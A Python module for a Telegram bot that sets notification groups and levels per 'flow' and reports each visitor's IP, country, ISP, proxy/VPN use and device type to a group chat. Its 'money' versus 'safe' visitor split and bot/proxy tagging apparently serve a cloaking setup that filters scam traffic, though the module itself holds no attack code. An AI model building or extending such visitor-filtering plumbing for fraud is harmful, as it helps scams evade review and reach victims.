"""
/setgroup    -1003570299128       (sets group for ALL flows)
/notifyon    parkside-fr
/notifyoff   parkside-fr
/notifylevel parkside-fr all|money|safe
/testnotify  parkside-fr
"""
import logging
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler
from core.domain_manager import (
    get_all_flows, require_flow, get_flow,
    set_notify_group, set_notify_enabled, set_notify_level,
)

logger = logging.getLogger(__name__)


async def cmd_setgroup(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/setgroup -1003570299128`", parse_mode="Markdown")
        return
    group_id = ctx.args[0]
    flows = get_all_flows()
    for row in flows:
        set_notify_group(row["flow_name"], group_id)
    await update.message.reply_text(
        f"✅ Notification group `{group_id}` applied to {len(flows)} flow(s).", parse_mode="Markdown"
    )


async def cmd_notifyon(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/notifyon parkside-fr`", parse_mode="Markdown")
        return
    flow_name = ctx.args[0].lower()
    try:
        require_flow(flow_name)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return
    set_notify_enabled(flow_name, True)
    await update.message.reply_text(f"🔔 Notifications enabled for flow `{flow_name}`", parse_mode="Markdown")


async def cmd_notifyoff(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/notifyoff parkside-fr`", parse_mode="Markdown")
        return
    flow_name = ctx.args[0].lower()
    try:
        require_flow(flow_name)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return
    set_notify_enabled(flow_name, False)
    await update.message.reply_text(f"🔕 Notifications disabled for flow `{flow_name}`", parse_mode="Markdown")


async def cmd_notifylevel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args) < 2:
        await update.message.reply_text(
            "Usage: `/notifylevel parkside-fr all|money|safe`", parse_mode="Markdown"
        )
        return
    flow_name = ctx.args[0].lower()
    level     = ctx.args[1].lower()
    if level not in ("all", "money", "safe"):
        await update.message.reply_text("Level must be `all`, `money`, or `safe`.", parse_mode="Markdown")
        return
    try:
        require_flow(flow_name)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return
    set_notify_level(flow_name, level)
    await update.message.reply_text(
        f"✅ Notify level for flow `{flow_name}` set to `{level}`", parse_mode="Markdown"
    )


async def cmd_testnotify(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/testnotify parkside-fr`", parse_mode="Markdown")
        return
    flow_name = ctx.args[0].lower()
    try:
        row = require_flow(flow_name)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return

    group_id = row["notify_group"]
    if not group_id:
        await update.message.reply_text(
            "❌ No group set. Run `/setgroup -1003570299128` first.", parse_mode="Markdown"
        )
        return
    try:
        await ctx.bot.send_message(
            chat_id=int(group_id),
            text=(
                f"🔔 *Test notification* for flow `{flow_name}`\n\n"
                f"✅ Notifications are working correctly.\n"
                f"notify\\_enabled = `{bool(row['notify_enabled'])}`\n"
                f"group\\_id = `{group_id}`"
            ),
            parse_mode="Markdown",
        )
        await update.message.reply_text(
            f"✅ Test message sent to group `{group_id}`", parse_mode="Markdown"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: `{e}`", parse_mode="Markdown")


async def send_visit_notification(bot, flow_name: str, action: str, ip: str, geo: dict,
                                   proxy: bool, device_type: str = "", os: str = ""):
    row = get_flow(flow_name)
    if not row:
        return
    if not row["notify_enabled"]:
        return
    group_id = row["notify_group"]
    if not group_id:
        return
    level = row["notify_level"] or "all"
    if level != "all" and level != action:
        return

    flag        = "🟢" if action == "money" else "🔴"
    proxy_tag   = " 🕵️ *proxy/VPN*" if proxy else ""
    device_icon = {"mobile": "📱", "tablet": "📟", "desktop": "🖥", "bot": "🤖"}.get(device_type, "❓")
    os_label    = {"android": "Android", "ios": "iOS", "windows": "Windows",
                   "macos": "macOS", "linux": "Linux"}.get(os, os or "?")

    text = (
        f"{flag} *{action.upper()}* · `{flow_name}`{proxy_tag}\n"
        f"IP      : `{ip}`\n"
        f"Country : {geo.get('country', 'N/A')} ({geo.get('country_code', '?')})\n"
        f"ISP     : {geo.get('isp', 'N/A')}\n"
        f"Device  : {device_icon} {device_type or '?'} / {os_label}"
    )
    try:
        await bot.send_message(chat_id=int(group_id), text=text, parse_mode="Markdown")
        logger.info("Notified group %s: flow=%s action=%s", group_id, flow_name, action)
    except Exception as e:
        logger.error("Notification failed flow=%s group=%s: %s", flow_name, group_id, e)


def register(app):
    app.add_handler(CommandHandler("setgroup",    cmd_setgroup))
    app.add_handler(CommandHandler("notifyon",    cmd_notifyon))
    app.add_handler(CommandHandler("notifyoff",   cmd_notifyoff))
    app.add_handler(CommandHandler("notifylevel", cmd_notifylevel))
    app.add_handler(CommandHandler("testnotify",  cmd_testnotify))
